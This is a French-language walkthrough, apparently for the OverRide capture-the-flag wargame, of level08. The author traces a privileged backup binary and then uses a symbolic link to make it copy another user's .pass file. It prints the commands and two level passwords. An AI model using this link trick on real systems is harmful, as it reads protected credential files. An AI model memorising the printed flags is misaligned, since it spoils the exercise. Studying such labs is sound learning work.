@@ -1,0 +1,61 @@
+apres une longue pause on reprend over
+
+donc je commence a essayer de lancer l executable
+rien de fou
+
+mais on oublie pas les bonne maniere je lance le ltrace apres
+
+level08@OverRide:~$ ltrace ./level08 
+__libc_start_main(0x4009f0, 1, 0x7fffffffe6f8, 0x400c60, 0x400cf0 <unfinished ...>
+printf("Usage: %s filename\n", "./level08"Usage: ./level08 filename
+)                                = 26
+fopen("./backups/.log", "w")                                               = 0
+printf("ERROR: Failed to open %s\n", "./backups/.log"ERROR: Failed to open ./backups/.log
+)                     = 37
+exit(1 <unfinished ...>
++++ exited (status 1) +++
+
+et on voit qu'il utilise le dossier backup
+
+je constate aussi avec un ls -la /backups qu'il y a un fichier cacher .log
+
+HOLALALALA j'ai un truc du coup je me suis dit il veut open un truc du coup je lui donne un truc:
+
+level08@OverRide:~$ ./level08 backups/
+ERROR: Failed to open ./backups/backups/
+
+donc il ouvre un fichier dans backup alors si on met notre fichier pass peut etre qu'on pourra l'ouvrir si ca ne marche pas on a toujours en tete les
+liens symboliques
+
+level08@OverRide:~$ ./level08 .pass 
+level08@OverRide:~$ cat backups/.log 
+LOG: Starting back up: .pass
+LOG: Finished back up .pass
+
+level08@OverRide:~$ ls -la backups/
+-r--r-----+ 1 level09 users    41 Mar 15 10:01 .pass
+level08@OverRide:~$ cat backups/.pass 
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
+
+LETS GO
+ha non c'est le flag pour aller a ce level la
+
+bon bon bon il faut prendre dans le users/level09/.pass
+
+du coup pour l'open il faudrait faire
+./level08 /home/users/level09/.pass
+ERROR: Failed to open ./backups//home/users/level09/.pass
+
+mais comme on peut le voir ca na pas marcher je vais chercher une solution
+
+comme je l'ai dit au dessus je pense qu'on a besoin d'un lien symbolique
+du coup je propose de cree un nouveau pass qui a un lien avec le pass level09
+donc je fais ln -s /home/users/level09/.pass pass
+je lance sur le pass qui point sur le pass level09
+
+./level08 pass 
+
+je cat le pass dans le backup et BOOM
+
+cat backups/pass 
+fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
